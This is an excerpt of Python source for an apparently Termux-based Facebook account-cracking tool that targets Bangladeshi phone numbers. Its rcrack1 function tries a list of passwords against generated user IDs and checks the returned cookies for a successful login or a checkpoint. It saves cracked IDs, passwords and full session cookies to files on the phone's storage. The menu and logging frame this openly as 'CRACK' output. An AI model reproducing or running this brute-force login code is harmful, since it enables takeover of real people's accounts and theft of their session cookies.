...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('xdg-open https://www.youtube.com/c/DJ71GAMING')
        print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START CRACK')
        print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;91m EXIT')
        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
        Shorif =input("\033[1;32m[\033[1;32m?\033[1;92m] CHOOSE : ")
        if Shorif in ["1", "01"]:
            v2()
        else:
            exit()
...
def v2():
    ...
    os.system('clear')
    print(logo)
    print('[*] BD NUMBER  => 013 014 015 016 017 018 019 ')
    kode = input('\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE CODE : ')
    ...
    print(linex)
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK COMPLETED..')
    print(linex)
#--------------------------(MATHOD BOX)--------------------------#
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sDJ\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
          ...
          'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;92m[DJ-OK] {uid}|{ps}")
                open('/sdcard/Mr-Devil/DJ-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;191m[DEVIL-CP] {uid}|{ps}")
                open('/sdcard/DJ71GAMING/DJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
